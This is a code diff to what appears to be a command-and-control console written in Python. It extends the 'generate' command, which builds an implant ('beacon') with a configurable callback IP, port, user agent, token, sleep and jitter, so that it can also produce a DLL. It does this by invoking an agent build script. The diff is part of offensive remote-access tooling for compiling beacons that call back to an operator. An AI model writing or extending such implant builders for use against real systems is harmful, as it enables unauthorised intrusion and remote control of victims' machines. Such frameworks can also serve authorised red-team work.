@@ -594,7 +594,6 @@ def cmd_output(aid, n=10):
     section_end()
 
 def cmd_generate(args_str):
-    """Beacon builder — unchanged from original."""
     gen = argparse.ArgumentParser(prog="generate", add_help=False, exit_on_error=False)
     gen.add_argument("--ip",     default=LISTEN_IP  if LISTEN_IP != "0.0.0.0" else "127.0.0.1")
     gen.add_argument("--port",   default=str(LISTEN_PORT))
@@ -603,50 +602,51 @@ def cmd_generate(args_str):
     gen.add_argument("--sleep",  default="5000")
     gen.add_argument("--jitter", default="3000")
     gen.add_argument("--https",  action="store_true")
-    gen.add_argument("--out",    default="beacon.exe")
-
+    gen.add_argument("--dll",    action="store_true",
+                                 help="build as DLL instead of EXE")
+    gen.add_argument("--out",    default=None)
     try:
         gargs = gen.parse_args(shlex.split(args_str) if args_str else [])
     except (argparse.ArgumentError, SystemExit):
-        log("usage: generate [--ip X] [--port X] ...", "err")
+        log("usage: generate [--ip X] [--port X] [--dll] [--out X] ...", "err")
         return
+
+    # Resolve output filename + mode
+    mode = "dll" if gargs.dll else "exe"
+    if gargs.out is None:
+        gargs.out = "beacon.dll" if gargs.dll else "beacon.exe"
+    elif gargs.dll and gargs.out.endswith(".exe"):
+        gargs.out = gargs.out[:-4] + ".dll"
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
     bat        = os.path.join(script_dir, "..", "agent", "build.bat")
     bat        = os.path.normpath(bat)
-
     if not os.path.exists(bat):
         log(f"build.bat not found at {bat}", "err")
         return
-
     https_flag = "1" if gargs.https else "0"
-    call = [bat, gargs.ip, gargs.port, gargs.ua, gargs.token,
-            gargs.sleep, gargs.jitter, https_flag, gargs.out]
-
     log(
         f"Building  {c(gargs.out, CYAN)}  "
         f"ip={c(gargs.ip, WHITE)}  port={c(gargs.port, WHITE)}  "
-        f"https={c(str(gargs.https), WHITE)}",
+        f"https={c(str(gargs.https), WHITE)}  mode={c(mode, WHITE)}",
         "build"
     )
-
     agent_dir  = os.path.normpath(os.path.join(script_dir, "..", "agent"))
     build_dir  = os.path.join(agent_dir, "build")
     tmp_out    = "_tmp_" + gargs.out
-
     if os.name == "nt":
         invoke = ["cmd", "/c", bat, gargs.ip, gargs.port, gargs.ua,
-                  gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
+                  gargs.token, gargs.sleep, gargs.jitter, https_flag,
+                  tmp_out, mode]
     else:
         invoke = [bat, gargs.ip, gargs.port, gargs.ua,
-                  gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
-
+                  gargs.token, gargs.sleep, gargs.jitter, https_flag,
+                  tmp_out, mode]
     try:
         result = subprocess.run(invoke, capture_output=True, text=True, cwd=agent_dir)
     except Exception as e:
         log(f"Failed to invoke build.bat: {e}", "err")
         return
-
     if result.returncode == 0:
         tmp_path   = os.path.join(build_dir, tmp_out)
         final_path = os.path.join(build_dir, gargs.out)
